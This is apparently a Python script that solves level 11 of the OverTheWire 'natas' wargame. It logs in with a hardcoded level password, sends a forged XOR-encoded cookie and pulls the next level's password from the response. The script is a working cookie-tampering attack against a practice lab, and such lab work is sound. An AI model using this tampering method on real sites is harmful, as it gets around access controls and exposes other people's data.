#!/usr/bin/env python

import requests
import re
import urllib
import base64

username = 'natas11'
password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()

#response = session.get(url, auth = (username, password) )
#response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit":"submit"}, auth = (username, password) )


cookies = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}
response = session.get(url, auth = (username, password), cookies = cookies )


content = response.text
#print base64.b64decode(urllib.unquote(session.cookies['data'])).encode('hex')
#print content
 
print re.findall('The password for natas12 is (.*)<br>', content)[0]